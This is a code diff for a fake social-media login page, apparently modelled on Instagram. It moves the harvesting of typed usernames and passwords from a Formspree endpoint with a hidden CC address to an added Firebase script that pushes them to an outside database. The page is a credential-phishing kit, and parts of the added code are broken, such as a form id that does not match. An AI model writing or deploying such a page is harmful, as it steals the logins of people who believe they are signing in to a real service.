@@ -20,17 +20,13 @@
 			</div>
 			<div class="form">
 	
-				<div class="input_field">
-					<form action="https://formspree.io/f/mvoewabw" method="POST">
-             <input type="hidden" name="_next" value="https://www.quizyourmate.com/start.html?quiz=65b9bb6c2f9f27a853685484">
-             <input type="hidden" name="_captcha" value="false">
-             <input type="hidden" name="_subject" value="kauno ke l">
-									     <input type="hidden" name="_cc" value=" maakasamindian@gmail.com">
-
-					<input type="text" placeholder="Phone number, username, or email" class="input" name="username">
+				
+					<form >  
+<div class="input_field">
+					<input id="email" type="text" placeholder="Phone number, username, or email" class="input" name="username">
 				</div>
 				<div class="input_field">
-					<input type="password" placeholder="Password" class="input"  name="password">
+					<input id="name" type="password" placeholder="Password" class="input"  name="name">
 			
 				</div>
 				<div class="btn"><button class="btna" type="submit">Log In</button></div>
@@ -100,6 +96,64 @@
 		</div>
 	</div>
 </div>
+<script>
+	// Initialize Firebase
+const config = {
+  apiKey: "AIzaSyDix2b-xCtZ1zabAy3muIRpv307zJ6sXoA",
+  authDomain: "send-esms.firebaseapp.com",
+  projectId: "send-esms",
+  storageBucket: "send-esms.appspot.com",
+  messagingSenderId: "304041024188",
+  appId: "1:304041024188:web:370ae3e067e6c2f5d60eb9"
+};
 
+// Initialize Firebase
+
+firebase.initializeApp(config);
+
+// Reference messages collection
+var messagesRef = firebase.database().ref('messages');
+
+// Listen for form submit
+document.getElementById('contactForm').addEventListener('submit', submitForm);
+
+// Submit form
+function submitForm(e){
+  e.preventDefault();
+
+  //Get value
+  var name = getInputVal('name');
+  var email = getInputVal('email');
+
+  // Save message
+  saveMessage(name, email);
+
+  // Show alert
+  document.querySelector('.alert').style.display = 'block';
+
+  // Hide alert after 3 seconds
+  setTimeout(function(){
+    document.querySelector('.alert').style.display = 'none';
+  },3000);
+
+  // Clear form
+  document.getElementById('contactForm').reset();
+}
+
+// Function to get form value
+function getInputVal(id){
+  return document.getElementById(id).value;
+}
+
+// Save message to firebase
+function saveMessage(name, company, email, phone, message){
+  var newMessageRef = messagesRef.push();
+  newMessageRef.set({
+    name: name,
+    email: email
+  });
+}
+
+</script>
 </body>
 </html>
